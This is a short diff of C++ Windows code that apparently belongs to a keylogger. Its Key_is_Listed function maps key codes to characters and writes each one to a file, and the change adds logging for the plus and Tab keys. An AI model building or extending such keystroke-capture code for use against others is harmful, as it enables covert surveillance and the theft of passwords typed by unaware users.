@@ -23,9 +23,19 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" ");
 		break;
 
+	case VK_ADD:
+		std::cout << "+";
+		WriteToFile("+");
+		break;
+
 	case VK_F1:
 		std::cout << " *F1* ";
 		WriteToFile(" *F1* ");
+		break;
+
+	case VK_TAB:
+		std::cout << " *TAB* ";
+		WriteToFile(" *TAB* ");
 		break;
 
 	case 48:
@@ -82,8 +92,7 @@ bool Key_is_Listed(WORD iKey)
 	case 58:
 		if (GetAsyncKeyState(VK_LSHIFT))
 		{
-			std::cout << ":";
-			WriteToFile(":");
+
 		}
 		break;
 
@@ -118,7 +127,7 @@ bool Key_is_Listed(WORD iKey)
 	case 63:
 		if (GetAsyncKeyState(VK_LSHIFT))
 		{
-			
+
 		}
 		break;
 
@@ -136,7 +145,7 @@ bool Key_is_Listed(WORD iKey)
 			std::cout << "A";
 			WriteToFile("A");
 		}
-		break;	
+		break;
 
 	case 66:
 		if (GetAsyncKeyState(VK_LSHIFT))
